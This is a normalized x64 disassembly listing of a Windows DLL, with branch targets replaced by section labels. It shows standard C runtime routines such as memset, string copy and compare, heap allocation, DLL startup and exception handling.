mov [ rcx ] rax
call sub_18000d068
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000ec1c
sub_18000bd10
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18000be10
mov r11 rcx
or r8 r8
je r-xdata
mov rax r11
retn
sub rcx rdx
test dl 0x7
je r-xdata
mov rax [ rdx ]
sub r8 0x8
jbe r-xdata
mov al [ rdx ]
test al al
mov [ rcx + rdx ] al
je r-xdata
add r8 0x8
je r-xdata
mov r9 0x7efefefefefefeff
add r9 rax
mov r10 rax
xor r10 0xffffffffffffffff
xor r10 r9
mov r9 0x8101010101010100
test r9 r10
je r-xdata
add rcx rdx
xor rdx rdx
cmp r8 0x10
jb r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
test al al
mov [ rcx + rdx ] al
je r-xdata
mov [ rcx + rdx ] rax
add rdx 0x8
sub r8 0x1
jb r-xdata
test cl 0x7
je r-xdata
test dl 0x7
jne r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
mov [ rcx ] dl
inc rcx
jmp r-xdata
sub r8 0x20
jb r-xdata
inc rcx
mov [ rcx ] dl
dec r8
jmp r-xdata
jmp r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
add r8 0x20
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] rdx
add rcx 0x20
sub r8 0x20
jae r-xdata
inc rdx
dec r8
je r-xdata
add r8 0x8
mov [ rcx ] rdx
add rcx 0x8
jmp r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
sub r8 0x8
jb r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr eax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
jne r-xdata
sub_18000bf74
cmp [ rdx ] 0x0
mov r9 rdx
mov r8 rcx
jne r-xdata
mov al [ rcx ]
test al al
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r11 rdx
neg r11
cmp [ rdx ] 0x0
je r-xdata
lea r10 [ r11 + r8 ]
mov rax r8
retn
inc r8
mov al [ r8 ]
test al al
jne r-xdata
movsx ecx [ r10 + rdx ]
movsx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r9
test al al
je r-xdata
inc rdx
cmp [ r10 + rdx ] 0x0
jne r-xdata
cmp [ rdx ] 0x0
je r-xdata
sub_18000bfcc
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_18000c060
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_18000c080
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000da6c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000ec1c
sub_18000c0dc
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbp
push rbx
push rdi
mov rbp rsp
sub rsp 0x50
and [ rbp - 0x30 ] 0x0
mov rdi rdx
xor edx edx
mov rbx rcx
lea rcx [ rbp - 0x28 ]
lea r8d [ rdx + 0x28 ]
call sub_18000bd10
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
jmp r-xdata
lea r9 [ rbp + 0x30 ]
lea rcx [ rbp - 0x30 ]
xor r8d r8d
mov rdx rdi
mov [ rbp - 0x28 ] 0x7fffffff
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rbx
mov [ rbp - 0x30 ] rbx
call sub_18000dd78
dec [ rbp - 0x28 ]
mov ebx eax
js r-xdata
add rsp 0x50
pop rdi
pop rbx
pop rbp
retn
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_18000dba0
mov rcx [ rbp - 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_18000c1a8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_18000c27c
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_18000ec1c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_18000ec64
call sub_18000ea3c
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_18000ea3c
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18000e9f4
mov [ rbx ] eax
mov rcx rbx
call sub_18000ec64
test eax eax
je r-xdata
call sub_18000ea3c
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18000e9f4
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_18000c27c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_18000ec64
call sub_18000ea3c
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_18000f340
mov ecx 0x1e
call sub_18000f0e0
mov ecx 0xff
call sub_18000ed4c
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_18000ea3c
mov [ rax ] 0xc
mov rcx rbx
call sub_18000ec64
test eax eax
je r-xdata
call sub_18000ea3c
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18000c334
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_18000c35c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_18000bfcc
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_18000d44c
mov r8d eax
sub_18000c3f4
sub rsp 0x28
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
mov ecx eax
call sub_18000ea7c
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
add rsp 0x28
retn
sub_18000c440
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_18000c774
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_18000ec98
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_18000f6a8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_18000f3a0
mov edx 0x2c8
mov ecx 0x1
call sub_18000f7ac
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_1800100ec
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_18000fff8
mov [ rw-data ] rax
call sub_18000f8b8
test eax eax
jns r-xdata
call sub_18000ecf0
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_18000f668
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_18000f07c
call sub_18000ff00
test eax eax
js r-xdata
call sub_18000f3ac
jmp r-xdata
call sub_18000ec1c
jmp r-xdata
xor edx edx
call sub_18000f3d4
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_18000fb8c
call sub_18000f3ac
call sub_18000ecf0
nop
call sub_18000fb8c
jmp r-xdata
call sub_18000fc00
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_18000ee30
test eax eax
jne r-xdata
call sub_18000f3ac
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_18000c8c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18000aa40
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18000c774
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18000c774
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18000aa40
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18000c774
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000c8c8
call sub_180010340
sub_18000ca24
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_18000c27c
test rax rax
je r-xdata
mov rcx rbx
call sub_18000ec64
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_18000d0b4
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_18000d1b8
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_18000cf40
lea rcx [ sub_180020130 ]
mov [ rw-data ] rbx
call sub_180010544
sub_18000cac8
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbp
push rbx
push rsi
push rdi
mov rbp rsp
sub rsp 0x58
and [ rbp - 0x38 ] 0x0
mov rbx rdx
xor edx edx
mov rsi r8
mov rdi rcx
lea r8d [ rdx + 0x28 ]
lea rcx [ rbp - 0x30 ]
call sub_18000bd10
test rsi rsi
jne r-xdata
test rbx rbx
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
lea r9 [ rbp + 0x40 ]
lea rcx [ rbp - 0x38 ]
cmp rbx rax
mov rdx rsi
mov [ rbp - 0x20 ] 0x42
cmova ebx eax
xor r8d r8d
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x30 ] ebx
mov [ rbp - 0x38 ] rdi
call sub_18000dd78
mov ebx eax
test rdi rdi
je r-xdata
test rdi rdi
je r-xdata
add rsp 0x58
pop rdi
pop rsi
pop rbx
pop rbp
retn
dec [ rbp - 0x30 ]
js r-xdata
lea rdx [ rbp - 0x38 ]
xor ecx ecx
call sub_18000dba0
mov rax [ rbp - 0x38 ]
mov [ rax ] 0x0
jmp r-xdata
mov eax ebx
sub_18000cb7c
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_1800105a0
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_1800105d0
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ r--data ]
call sub_180010660
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_18000cd7c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_18000f510
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_1800111f0
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_180010920
mov [ rbx + 0x8 ] rax
sub_18000ce20
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rdi rcx
mov rbp rcx
mov rsi rdx
lea rcx [ rax - 0x28 ]
mov rdx r9
mov rbx r8
call sub_18000cd7c
test rbp rbp
jne r-xdata
test rsi rsi
jne r-xdata
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x28 ]
cmp [ rcx + 0x8 ] 0x0
jne r-xdata
test rbx rbx
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test rbx rbx
je r-xdata
mov r8 rbx
mov rdx rsi
mov rcx rdi
call sub_18000be10
cmp [ rsp + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
movzx eax [ rsi ]
dec rbx
test [ rax + rcx + 0x1d ] 0x4
mov [ rdi ] al
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax rbp
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
inc rdi
inc rsi
test al al
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
jmp r-xdata
mov [ rdi ] 0x0
jmp r-xdata
mov al [ rsi + 0x1 ]
add rdi 0x2
dec rbx
mov [ rdi - 0x1 ] al
add rsi 0x2
test al al
jne r-xdata
mov r8 rbx
xor edx edx
mov rcx rdi
call sub_18000bd10
mov [ rdi - 0x2 ] al
sub_18000cf70
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_1800112a0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_18000c27c
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_180011824
mov [ rdi + 0x10 ] 0x1
sub_18000cff4
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_18000cf70
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d024
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_18000cfcc
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_18000cf70
jmp r-xdata
sub_18000d078
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000cfcc
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000ec1c
sub_18000d0f0
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
